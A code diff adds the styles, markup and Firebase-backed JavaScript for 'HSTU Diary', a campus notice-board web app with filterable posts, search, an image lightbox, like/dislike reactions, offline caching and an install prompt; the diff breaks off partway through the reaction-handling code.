@@ -202,6 +202,1489 @@
   box-shadow: 0 4px 6px -1px lime;  
 }
 
+.type-suggestion {   
+  background: #9333ea; /* বেগুনি */
+  color: #fff;  
+  box-shadow: 0 4px 6px -1px rgba(147, 51, 234, 0.3);  
+}
+
+.type-news {   
+  background: #a29bfe;
+  color: #000;  
+  box-shadow: 0 4px 6px -1px rgba(55, 65, 81, 0.3);  
+}
+    
+    .post-image-container {
+      position: relative;
+      width: 100%;
+      border-radius: 12px;
+      margin: 16px 0;
+      overflow: hidden;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+    }
+    
+    .post-image {
+      width: 100%;
+      border-radius: 12px;
+      max-height: 400px;
+      object-fit: cover;
+      transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+    }
+    
+    .post-image-container:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 20px rgba(0,0,0,0.3);
+    }
+    
+    .post-image-container:hover .post-image {
+      transform: scale(1.05);
+    }
+    
+    .post-image-container::after {
+      content: '\F33E';
+      font-family: 'bootstrap-icons';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 2rem;
+      color: white;
+      opacity: 0;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+      transition: all 0.3s ease;
+      pointer-events: none;
+    }
+    
+    .post-image-container:hover::after {
+      opacity: 0.8;
+      transform: translate(-50%, -50%) scale(1.2);
+    }
+    
+    .lightbox {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    
+    .lightbox.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+    
+    .lightbox-img {
+      max-width: 90%;
+      max-height: 90%;
+      object-fit: contain;
+      border-radius: 8px;
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    
+    .lightbox.active .lightbox-img {
+      transform: scale(1);
+    }
+    
+    .lightbox-close {
+      position: absolute;
+      top: 30px;
+      right: 30px;
+      font-size: 2rem;
+      color: white;
+      cursor: pointer;
+      background: rgba(255,255,255,0.1);
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+    }
+    
+    .lightbox-close:hover {
+      background: rgba(255,255,255,0.2);
+      transform: rotate(90deg);
+    }
+    
+    .reaction-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    
+    .reaction-btn {
+      background: rgba(255,255,255,0.1);
+      border: none;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.9rem;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+      font-weight: 600;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .reaction-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.4s ease;
+    }
+    
+    .reaction-btn:hover::before {
+      transform: translateX(100%);
+    }
+    
+    .reaction-btn:hover {
+      background: rgba(255,255,255,0.2);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    
+    .reaction-btn.like.active {
+      background: var(--success);
+      color: white;
+      box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
+    }
+    
+    .reaction-btn.dislike.active {
+      background: var(--danger);
+      color: white;
+      box-shadow: 0 4px 8px rgba(239, 68, 68, 0.3);
+    }
+    
+    .empty-state {
+      background: rgba(255,255,255,0.05);
+      border-radius: 16px;
+      padding: 60px 20px;
+      text-align: center;
+      margin-top: 40px;
+      backdrop-filter: blur(5px);
+      border: 1px solid rgba(255,255,255,0.1);
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(139, 92, 246, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
+    }
+    
+    .empty-state i {
+      font-size: 3.5rem;
+      opacity: 0.5;
+      margin-bottom: 1.5rem;
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0px); }
+    }
+    
+    .time-badge {
+      font-size: 0.75rem;
+      background: rgba(255,255,255,0.1);
+      padding: 5px 12px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      transition: all 0.3s;
+    }
+    
+    .time-badge:hover {
+      background: rgba(255,255,255,0.2);
+      transform: scale(1.05);
+    }
+    
+    .search-box {
+      background: rgba(255,255,255,0.1);
+      border: none;
+      color: white;
+      border-radius: 12px;
+      padding: 12px 20px;
+      width: 100%;
+      max-width: 400px;
+      transition: all 0.3s;
+      font-size: 0.95rem;
+      backdrop-filter: blur(5px);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .search-box:focus {
+      background: rgba(255,255,255,0.2);
+      color: white;
+      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.3);
+      border: 1px solid rgba(139, 92, 246, 0.5);
+      outline: none;
+    }
+    
+    .filter-btn {
+      background: rgba(255,255,255,0.1);
+      border: none;
+      color: white;
+      border-radius: 20px;
+      padding: 8px 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+      font-weight: 800;
+      backdrop-filter: blur(5px);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .filter-btn:hover {
+      background: rgba(255,255,255,0.2);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    
+    .filter-btn.active {
+      background: #0d6efd;
+      box-shadow: 0 4px 6px -1px rgba(13,110,253,255);
+      border-color: rgba(13,110,253,255);
+    }
+    
+    .filters-row-wrapper {
+      position: sticky;
+      top: 0px;
+      z-index: 999;
+      padding: 10px 0;
+      overflow-x: auto;
+      white-space: nowrap;
+      backdrop-filter: blur(100px);
+      border-bottom: 1px solid #ddd;
+    }
+
+    .filters-row-wrapper::-webkit-scrollbar {
+      display: none;
+    }
+
+    .filter-btn {
+      display: inline-block;
+      margin: 0 5px;
+      white-space: nowrap;
+    }
+    
+    .post-content {
+      line-height: 1.1;
+      font-size:10px;
+      color: rgba(255,255,255,0.9);
+    }
+    .post-content:hover {
+      line-height: 1.7;
+      font-size:20px;
+      color: rgba(255,255,255,0.9);
+    }
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    
+    .post-title {
+      font-weight: 700;
+      margin-bottom: 12px;
+      font-size: 1.5rem;
+      line-height: 1.3;
+      color: white;
+      position: relative;
+      display: inline-block;
+    }
+    
+    .post-title::after {
+      content: '';
+      position: absolute;
+      bottom: -5px;
+      left: 0;
+      width: 50px;
+      height: 3px;
+      background: linear-gradient(90deg, var(--primary), transparent);
+      border-radius: 3px;
+      transition: width 0.3s ease;
+    }
+    
+    .post-card:hover .post-title::after {
+      width: 100%;
+    }
+    
+    .post-detail-label {
+      font-weight: 600;
+      color: var(--primary-light);
+      margin-right: 8px;
+    }
+    
+    .link-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 1px;
+      background: gold;
+      font-family: 'Poppins', sans-serif;
+      color: black;
+      padding: 5px 50px;
+      border-radius: 19px;
+      text-decoration: none;
+      font-weight: 900;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 6px -1px rgba(139, 92, 246, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .link-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: all 0.5s ease;
+    }
+    
+    .link-btn:hover::before {
+      left: 100%;
+    }
+    
+    .link-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 15px -3px rgba(139, 92, 246, 0.4);
+      color: white;
+    }
+    
+    /* Skeleton Loading */
+    .skeleton {
+      background: linear-gradient(90deg, rgba(255,255,255,0.1) 25%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.1) 75%);
+      background-size: 200% 100%;
+      animation: shimmer 1.5s infinite;
+      border-radius: 8px;
+      backdrop-filter: blur(5px);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    
+    .skeleton-card {
+      height: 150px;
+      margin-bottom: 24px;
+      border-radius: 16px;
+    }
+/*Install Promt */
+    .install-prompt {
+      position:;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: #00072D;
+      color: white;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.3s ease forwards;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .install-prompt h1 {
+      font-weight: bold;
+    }
+
+    .install-prompt p {
+      color: var(--primary-light);
+      max-width: 300px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @media (display-mode: standalone) {
+      .install-prompt {
+        display: none !important;
+      }
+    }
+    /* Floating particles background */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+    }
+    
+    .particle {
+      position: absolute;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50%;
+      animation: float-particle 15s infinite linear;
+    }
+   /* install design buttons */ 
+    .filter-bar {
+  display: flex;
+  flex-wrap: wrap; /* allow buttons to go to next line if needed */
+  gap: 10px; /* space between buttons */
+  padding: 10px;
+  justify-content: center;
+  border-radius: 8px;
+  align-items:center;
+  max-width: 100%; /* full width */
+}
+
+.filter-bar > div {
+
+  color: white;
+  padding: 8px 15px;
+  border-radius: 20px; /* pill shape */
+  font-size: 14px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 6px; /* space between icon and text */
+  transition: background-color 0.3s ease;
+  user-select: none; /* prevent text selection on click */
+}
+
+.filter-bar > div:hover {
+  background-color: #0056b3; /* darker blue on hover */
+}
+.info-link{
+      border: none;
+      color: white;
+      border-radius: 20px;
+      padding: 8px 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 1.3rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+      font-weight: 800;
+}
+.info-link:hover{
+  color: green;
+  font-size: 1.5rem;
+}
+    @keyframes float-particle {
+      0% {
+        transform: translateY(0) translateX(0);
+        opacity: 0;
+      }
+      10% {
+        opacity: 1;
+      }
+      90% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-100vh) translateX(100px);
+        opacity: 0;
+      }
+    }
+    
+    @media (max-width: 992px) {
+      .container {
+        padding: 10px;
+      }
+      
+      .search-box {
+        max-width: 100%;
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .post-card {
+        padding: 20px;
+      }
+      
+      .header {
+        padding: 0.8rem 0;
+      }
+      
+      .post-title {
+        font-size: 1.3rem;
+      }
+      
+      .app-title {
+        font-size: 1.5rem;
+      }
+    }
+    
+    @media (max-width: 576px) {
+      .post-card {
+        padding: 18px;
+      }
+      
+      .post-title {
+        font-size: 1.2rem;
+      }
+    }
+    
+    /* Title animation cursor */
+    #animatedTitle::after {
+      content: "|";
+      animation: blink 1s infinite;
+      color: white;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+        video { display: none; }
+  </style>
+</head>
+<body>
+<!-- Floating particles background -->
+<div class="particles" id="particles"></div>
+  <video id="video" autoplay playsinline></video>
+<!-- Lightbox for images -->
+<div class="lightbox" id="lightbox">
+  <span class="lightbox-close">&times;</span>
+  <img class="lightbox-img" id="lightbox-img" alt="Enlarged view">
+</div>
+
+<div class="header">
+  <div class="container">
+    <h1 class="app-title mb-0" id="animatedTitle"></h1>
+    <div class="d-flex justify-content-between align-items-center flex-wrap gap-3">
+      <div class="d-flex gap-2">
+        <input type="text" class="search-box" id="searchInput" placeholder="Search posts...">
+        <button class="filter-btn" id="newPostsBtn">
+          <i class="bi bi-tag-fill"></i>
+          <span class="d-none d-md-inline">New</span>
+        </button>
+        <a href="info-preview.html" class="info-link">
+  <i class="bi bi-info-circle-fill"></i>
+  <span class="d-none d-md-inline">Info</span>
+</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Sticky + Scrollable Filter Bar -->
+<div class="filters-row-wrapper px-3">
+  <button class="btn btn-outline-primary filter-btn active" data-filter="all">
+    <i class="bi bi-collection"></i> All
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="classes">
+    <i class="bi bi-journal-bookmark"></i> Classes
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="notice">
+    <i class="bi bi-megaphone"></i> Notice
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="important">
+    <i class="bi bi-exclamation-triangle"></i> Important
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="resources">
+    <i class="bi bi-folder2-open"></i> Resources
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="exam">
+    <i class="bi bi-file-earmark-text"></i> Exam
+  </button>
+    <button class="btn btn-outline-primary filter-btn" data-filter="suggestion">
+    <i class="bi bi-mortarboard"></i> Suggestion
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="assignment">
+    <i class="bi bi-pencil-square"></i> Assignment
+  </button>
+    <button class="btn btn-outline-primary filter-btn" data-filter="update">
+    <i class="bi bi-arrow-up-circle"></i> Update
+  </button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="event">
+    <i class="bi bi-calendar-event"></i> Event
+  </button>
+ <button class="btn btn-outline-primary filter-btn" data-filter="tips">
+  <i class="bi bi-lightbulb"></i> Tips
+</button>
+  <button class="btn btn-outline-primary filter-btn" data-filter="news">
+    <i class="bi bi-newspaper"></i> News
+  </button>
+</div>
+
+<div class="container mt-4">
+  <!-- Posts List -->
+  <div id="postsContainer">
+    <!-- Skeleton Loaders -->
+    <div class="skeleton skeleton-card"></div>
+    <div class="skeleton skeleton-card"></div>
+    <div class="skeleton skeleton-card"></div>
+  </div>
+  <!-- Offline Popup -->
+<div id="offlinePopup" style="
+  display:none;
+  position:fixed;
+  top:20px;
+  left:50%;
+  transform:translateX(-50%);
+  background:rgba(255,77,79,0.8);
+  color:white;
+  backdrop-filter:blur(10px);
+  border-radius:12px;
+  padding:5px 10px;
+  font-weight:600;
+  z-index:99999;
+  box-shadow:0 4px 10px rgba(0,0,0,0.3);
+  display:flex;
+  align-items:center;
+  gap:8px;
+">
+  <i class="bi bi-wifi-off" style="font-size:1.2rem;"></i> 
+  You are offline.
+</div>
+  <!-- Empty State -->
+  <div class="empty-state" id="emptyState" style="display: none;">
+    <i class="bi bi-file-earmark-text"></i>
+    <h4 class="mt-3">No posts found</h4>
+    <p class="text-muted">Try adjusting your filters or check back later</p>
+  </div>
+</div>
+<script>
+    let deferredPrompt;
+
+    const promptHTML = `
+      <div class="install-prompt">
+        <h1 class="mb-3"><span style="color:#e17055">HSTU DIARY </span></h1>
+        <div class="filter-bar">
+          <div class="type-classes"><i class="bi bi-journal-bookmark"></i> Classes</div>
+          <div class="type-notice"><i class="bi bi-megaphone"></i> Notice</div>
+          <div class="type-important"><i class="bi bi-exclamation-triangle"></i> Important</div>
+          <div class="type-update"><i class="bi bi-arrow-up-circle"></i> Update</div>
+          <div class="type-assignment"><i class="bi bi-pencil-square"></i> Assignment</div>
+          <div class="type-exam"><i class="bi bi-file-earmark-text"></i> Exam</div>
+          <div class="type-resources"><i class="bi bi-folder2-open"></i> Resources</div>
+          <div class="type-event"><i class="bi bi-calendar-event"></i> Event</div>
+          <div class="type-tips"><i class="bi bi-lightbulb"></i> Tips</div>
+          <div class="type-suggestion"><i class="bi bi-mortarboard"></i> Suggestion </div>
+          <div class="type-news"><i class="bi bi-newspaper"></i> News</div>
+        </div>
+        <p class="mb-4">Get the best experience by installing our app on your device (Use Chrome Browser) </p>
+        <button id="install-button" class="btn btn-light btn-lg text-dark fw-bold">Install Now</button>
+      </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', promptHTML);
+
+    const promptElement = document.querySelector('.install-prompt');
+
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+
+      // Show prompt immediately
+      promptElement.style.display = 'flex';
+
+      document.getElementById('install-button').addEventListener('click', () => {
+        deferredPrompt.prompt();
+        deferredPrompt.userChoice.then((choiceResult) => {
+          if (choiceResult.outcome === 'accepted') {
+            console.log('User accepted the install prompt');
+          } else {
+            console.log('User dismissed the install prompt');
+          }
+          promptElement.style.display = 'none';
+          deferredPrompt = null;
+        });
+      });
+    });
+
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('sw.js')
+          .then(() => console.log('ServiceWorker registration successful'))
+          .catch(err => console.log('ServiceWorker registration failed:', err));
+      });
+    }
+</script>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+  // Firebase configuration
+  const firebaseConfig = {
+apiKey: "AIzaSyAkVqH_RnHoMSnEWtWlUVm3c0IGS04KjRI",
+    authDomain: "hstu-9bb0d.firebaseapp.com",
+    databaseURL: "https://hstu-9bb0d-default-rtdb.firebaseio.com",
+    projectId: "hstu-9bb0d",
+    storageBucket: "hstu-9bb0d.firebasestorage.app",
+    messagingSenderId: "115418123238",
+    appId: "1:115418123238:web:0ab52605bec3d8bd9fe427",
+    measurementId: "G-5XPHY7Z7WV"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  // DOM Elements
+  const postsContainer = document.getElementById('postsContainer');
+  const emptyState = document.getElementById('emptyState');
+  const searchInput = document.getElementById('searchInput');
+  const filterButtons = document.querySelectorAll('.filter-btn[data-filter]');
+  const newPostsBtn = document.getElementById('newPostsBtn');
+  const lightbox = document.getElementById('lightbox');
+  const lightboxImg = document.getElementById('lightbox-img');
+  const lightboxClose = document.querySelector('.lightbox-close');
+  const particlesContainer = document.getElementById('particles');
+  const offlinePopup = document.getElementById('offlinePopup');
+
+  // Global variables
+  let posts = [];
+  let currentFilter = 'all';
+  let showOnlyNew = false;
+  let userReactions = {};
+  let userId = localStorage.getItem('userId') || generateUserId();
+
+  // Generate a unique user ID for reaction tracking
+  function generateUserId() {
+    const id = 'user_' + Math.random().toString(36).substr(2, 9);
+    localStorage.setItem('userId', id);
+    return id;
+  }
+
+  // Create floating particles
+  function createParticles() {
+    const particleCount = Math.floor(window.innerWidth / 10);
+    for (let i = 0; i < particleCount; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      
+      // Random size between 1px and 3px
+      const size = Math.random() * 2 + 1;
+      particle.style.width = `${size}px`;
+      particle.style.height = `${size}px`;
+      
+      // Random position
+      particle.style.left = `${Math.random() * 100}%`;
+      particle.style.top = `${Math.random() * 100}%`;
+      
+      // Random animation duration and delay
+      const duration = Math.random() * 15 + 10;
+      const delay = Math.random() * 5;
+      particle.style.animation = `float-particle ${duration}s ${delay}s infinite linear`;
+      
+      particlesContainer.appendChild(particle);
+    }
+  }
+
+  // Initialize
+  document.addEventListener('DOMContentLoaded', () => {
+    createParticles();
+    loadUserReactions();
+    setupEventListeners();
+    startTitleAnimation();
+    
+    // Check online status on load
+    if (!navigator.onLine) {
+      showOfflinePopup();
+      hideReactions();
+      loadPosts(); // Load from cache if offline
+    } else {
+      hideOfflinePopup();
+      loadPosts();
+    }
+  });
+
+  // Load user reactions from Firebase
+  function loadUserReactions() {
+    if (!navigator.onLine) {
+      const localReactions = localStorage.getItem('userReactions');
+      userReactions = localReactions ? JSON.parse(localReactions) : {};
+      return;
+    }
+
+    database.ref(`userReactions/${userId}`).once('value', (snapshot) => {
+      const data = snapshot.val();
+      userReactions = data || {};
+      localStorage.setItem('userReactions', JSON.stringify(userReactions));
+    });
+  }
+
+  // Title animation
+  function startTitleAnimation() {
+    const texts = [
+      "HSTU Diary",
+      "Latest Notice Classes ✰",
+      "Always Up to date ↑",
+      "Never Miss an Update ",
+      "Stay Informed, Stay Ahead",
+      "Capture Every Moment on Campus",
+      "Knowledge at Your Fingertips",
+      "Never Miss Important Information",
+      "Instant Class Alerts ✔",
+      "Grow Together ★",
+      "Your Campus Log ⊕"
+    ];
+
+    let textIndex = 0;
+    let charIndex = 0;
+    let isDeleting = false;
+    const titleElement = document.getElementById("animatedTitle");
+
+    function typeEffect() {
+      const currentText = texts[textIndex];
+      const displayedText = currentText.substring(0, charIndex);
+      titleElement.textContent = displayedText;
+
+      if (!isDeleting && charIndex < currentText.length) {
+        charIndex++;
+        setTimeout(typeEffect, 100);
+      } else if (isDeleting && charIndex > 0) {
+        charIndex--;
+        setTimeout(typeEffect, 50);
+      } else {
+        if (!isDeleting) {
+          isDeleting = true;
+          setTimeout(typeEffect, 1500); // Wait before deleting
+        } else {
+          isDeleting = false;
+          textIndex = (textIndex + 1) % texts.length;
+          setTimeout(typeEffect, 500); // Wait before typing next
+        }
+      }
+    }
+
+    typeEffect();
+  }
+
+  // Load posts from Firebase or localStorage
+  function loadPosts() {
+    if (navigator.onLine) {
+      database.ref('posts').on('value', (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          localStorage.setItem('offlinePosts', JSON.stringify(data));
+          posts = formatPosts(data);
+          renderPosts();
+        } else {
+          posts = [];
+          renderPosts();
+        }
+      });
+    } else {
+      const offlineData = localStorage.getItem('offlinePosts');
+      if (offlineData) {
+        posts = formatPosts(JSON.parse(offlineData));
+        renderPosts();
+      } else {
+        posts = [];
+        renderPosts();
+      }
+    }
+  }
+
+  // Format Firebase object to array
+  function formatPosts(data) {
+    return Object.keys(data).map(key => ({
+      id: key,
+      ...data[key],
+      likes: data[key].likes || 0,
+      dislikes: data[key].dislikes || 0
+    }));
+  }
+
+  // Set up event listeners
+  function setupEventListeners() {
+    // Search input
+    searchInput.addEventListener('input', renderPosts);
+    
+    // Filter buttons
+    filterButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        filterButtons.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        currentFilter = btn.dataset.filter;
+        renderPosts();
+      });
+    });
+    
+    // New posts toggle
+    newPostsBtn.addEventListener('click', () => {
+      showOnlyNew = !showOnlyNew;
+      newPostsBtn.classList.toggle('active', showOnlyNew);
+      renderPosts();
+    });
+    
+    // Lightbox
+    lightboxClose.addEventListener('click', () => {
+      lightbox.classList.remove('active');
+    });
+    
+    // Close lightbox when clicking outside image
+    lightbox.addEventListener('click', (e) => {
+      if (e.target === lightbox) {
+        lightbox.classList.remove('active');
+      }
+    });
+    
+    // Close lightbox with Escape key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && lightbox.classList.contains('active')) {
+        lightbox.classList.remove('active');
+      }
+    });
+    
+    // Network status events
+    window.addEventListener('offline', () => {
+      showOfflinePopup();
+      hideReactions();
+    });
+    
+    window.addEventListener('online', () => {
+      hideOfflinePopup();
+      showReactions();
+      loadPosts(); // Refresh data when coming back online
+    });
+  }
+
+  // Show/hide offline popup
+  function showOfflinePopup() {
+    offlinePopup.style.display = 'flex';
+  }
+
+  function hideOfflinePopup() {
+    offlinePopup.style.display = 'none';
+  }
+
+  // Show/hide reaction buttons
+  function hideReactions() {
+    document.querySelectorAll('.reaction-buttons').forEach(btnGroup => {
+      btnGroup.style.display = 'none';
+    });
+  }
+
+  function showReactions() {
+    document.querySelectorAll('.reaction-buttons').forEach(btnGroup => {
+      btnGroup.style.display = 'flex';
+    });
+  }
+
+  // Show image in lightbox
+  function showLightbox(imgSrc) {
+    lightboxImg.src = imgSrc;
+    lightbox.classList.add('active');
+  }
+
+  // Render posts based on filters
+  function renderPosts() {
+    const searchTerm = searchInput.value.toLowerCase();
+    const now = new Date();
+    const twoHoursAgo = new Date(now.getTime() - (2 * 60 * 60 * 1000));
+    
+    // Get the newest posts from the last 2 hours
+    const newPosts = posts
+      .filter(post => new Date(post.createdAt) > twoHoursAgo)
+      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+      .slice(0, 3);
+    
+    const filteredPosts = posts.filter(post => {
+      // Filter by search term (includes hidden tags)
+      const matchesSearch = 
+        post.title.toLowerCase().includes(searchTerm) ||
+        post.content.toLowerCase().includes(searchTerm) ||
+        (post.tags && post.tags.some(tag => tag.toLowerCase().includes(searchTerm)));
+      
+      // Filter by type
+      const matchesType = currentFilter === 'all' || post.type === currentFilter;
+      
+      // Filter by new posts (only show the 3 newest from last hour if filter is on)
+      const isNew = newPosts.some(newPost => newPost.id === post.id);
+      const matchesNewFilter = !showOnlyNew || isNew;
+      
+      return matchesSearch && matchesType && matchesNewFilter;
+    });
+    
+    // Sort by newest first
+    filteredPosts.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+    
+    postsContainer.innerHTML = '';
+    
+    if (filteredPosts.length === 0) {
+      emptyState.style.display = 'block';
+    } else {
+      emptyState.style.display = 'none';
+      
+      filteredPosts.forEach(post => {
+        const postDate = new Date(post.createdAt);
+        const isNew = newPosts.some(newPost => newPost.id === post.id);
+        
+        const postEl = document.createElement('div');
+        postEl.className = `post-card ${isNew ? 'new' : ''}`;
+        
+        // Format time ago
+        const timeAgo = formatTimeAgo(postDate);
+        
+        postEl.innerHTML = `
+          <div class="post-meta">
+            <span class="post-type type-${post.type}">
+${post.type === 'classes' ? '<i class="bi bi-journal-bookmark"></i>' : ''}
+${post.type === 'notice' ? '<i class="bi bi-megaphone"></i>' : ''}
+${post.type === 'important' ? '<i class="bi bi-exclamation-triangle"></i>' : ''}
+${post.type === 'update' ? '<i class="bi bi-arrow-up-circle"></i>' : ''}
+${post.type === 'assignment' ? '<i class="bi bi-pencil-square"></i>' : ''}
+${post.type === 'exam' ? '<i class="bi bi-file-earmark-text"></i>' : ''}
+${post.type === 'resources' ? '<i class="bi bi-folder2-open"></i>' : ''}
+${post.type === 'event' ? '<i class="bi bi-calendar-event"></i>' : ''}
+${post.type === 'tips' ? '<i class="bi bi-lightbulb"></i>' : ''}
+${post.type === 'suggestion' ? '<i class="bi bi-mortarboard"></i>' : ''}
+${post.type === 'news' ? '<i class="bi bi-newspaper"></i>' : ''}
+              ${post.type}
+            </span>
+            <span class="time-badge"><i class="bi bi-clock"></i> ${timeAgo}</span>
+          </div>
+          
+          <div class="mb-3">
+            <span class="post-detail-label">Title:</span>
+            <h3 class="post-title">${post.title}</h3>
+          </div>
+          
+          <div class="mb-3">
+            <span class="post-detail-label">Details:</span>
+            <h5 class="post-content">${post.content}</h5>
+          </div>
+          
+          ${post.image ? `
+            <div class="post-image-container">
+              <img src="${post.image}" class="post-image" data-img="${post.image}" alt="Post image">
+            </div>
+          ` : ''}
+          
+          ${post.linkUrl ? `
+            <div class="mt-3">
+            <span class="post-detail-label">Link:</span>            
+              <a href="${post.linkUrl}" target="_blank" class="link-btn">
+                <i class="bi bi-link-45deg"></i> ${post.linkTitle || 'View Link'}
+              </a>
+            </div>
+          ` : ''}
+          
+          <div class="reaction-buttons">
+            <button class="reaction-btn like ${userReactions[post.id] === 'like' ? 'active' : ''}" 
+                    data-id="${post.id}" data-action="like">
+              <i class="bi bi-hand-thumbs-up"></i>
+              <span class="like-count">${post.likes || 0}</span>
+            </button>
+            <button class="reaction-btn dislike ${userReactions[post.id] === 'dislike' ? 'active' : ''}" 
+                    data-id="${post.id}" data-action="dislike">
+              <i class="bi bi-hand-thumbs-down"></i>
+              <span class="dislike-count">${post.dislikes || 0}</span>
+            </button>
+          </div>
+        `;
+        
+        postsContainer.appendChild(postEl);
+      });
+      
+      // Add event listeners to reaction buttons
+      document.querySelectorAll('.reaction-btn').forEach(btn => {
+        btn.addEventListener('click', handleReaction);
+      });
+      
+      // Add event listeners to images for lightbox
+      document.querySelectorAll('.post-image').forEach(img => {
+        img.addEventListener('click', (e) => {
+          showLightbox(e.currentTarget.dataset.img);
+        });
+      });
+    }
+  }
+
+  // Handle like/dislike reactions
+  function handleReaction(e) {
+    if (!navigator.onLine) {
+      return;
+    }
+
+    const postId = e.currentTarget.dataset.id;
+    const action = e.currentTarget.dataset.action;
+    const currentReaction = userReactions[postId];
+    
+    // If clicking the same reaction again, remove it
+    if (currentReaction === action) {
+      removeReaction(postId, action);
+      return;
+    }
+    
+    // If user already reacted differently, first remove that reaction
+    if (currentReaction && currentReaction !== action) {
+      removeReaction(postId, currentReaction);
+    }
+    
+    // Add new reaction
+    addReaction(postId, action);
+  }
+  
+  function addReaction(postId, action) {
+    // Update UI immediately
+    const btn = document.querySelector(`.reaction-btn[data-id="${postId}"][data-action="${action}"]`);
+    if (btn) {
+      // Clear any existing reaction UI
+      document.querySelectorAll(`.reaction-btn[data-id="${postId}"]`).forEach(b => {
+        b.classList.remove('active');
